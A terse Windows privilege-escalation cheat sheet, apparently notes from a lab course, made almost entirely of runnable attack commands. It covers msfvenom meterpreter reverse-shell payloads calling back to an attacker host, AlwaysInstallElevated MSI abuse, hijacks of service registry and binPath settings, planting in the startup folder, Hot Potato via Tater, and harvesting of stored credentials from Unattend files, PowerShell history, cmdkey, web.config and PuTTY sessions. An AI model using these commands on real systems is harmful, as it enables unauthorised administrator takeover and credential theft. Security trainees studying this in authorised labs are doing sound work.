#winpriv #windows #cheetsheet 

---------------------------Auto Run

```

C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"

msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe

```


-------------------------------------AlwaysInstalledElevated



```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

notice “AlwaysInstallElevated” value is 1.  

reg query HKCU\Software\Policies\Microsoft\Windows\Installer

notice “AlwaysInstallElevated” value is 1

msfvenom -p windows/meterpreter/reverse_tcp lhost=tun1 -f msi -o setup.msi

msiexec /quiet /qn /i C:\Temp\setup.msi
```



-----------------------------Service Escalation - Registry


```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

if you see this “NT AUTHORITY\INTERACTIVE” has “FullContol”

cmd.exe /k net localgroup administrators user /add

x86_64-w64-mingw32-gcc windows_service.c -o x.exe  

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t

REG_EXPAND_SZ /d c:\temp\x.exe /f

sc start regsvc

net localgroup administrators
```



--------------------------------Service Escalation - Executable Files

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"

Notice “Everyone” user group has “FILE_ALL_ACCESS” 

copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"

sc start filepermsvc
```


---------------------------Startup Applications


```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

notice “BUILTIN\Users” group has full access ‘(F)’

move c:\temp\x.exe C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

now wait for the admin user to login
```


-----------------------------Service Escalation - binPath


```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc

Notice “User-PC\User” has the “SERVICE_CHANGE_CONFIG”

sc config daclsvc binpath= "net localgroup administrators user /add"

sc start daclsvc

net localgroup administrators
```


----------------------------Service Escalation - Unquoted Service Paths

```
sc qc unquotedsvc

msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe

sc start unquotedsvc

net localgroup administrators
```


------------------------------------Hot Potato

```
powershell.exe -nop -ep bypass

Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1

Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"

net localgroup administrators

```


-----------------------------Harvesting Passwords

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

```
Powershell

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```
cmdkey /list
```

```
runas /savecred /user:admin cmd.exe
```

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

bloody windictve saale flow mere fast maine gari bhadadii
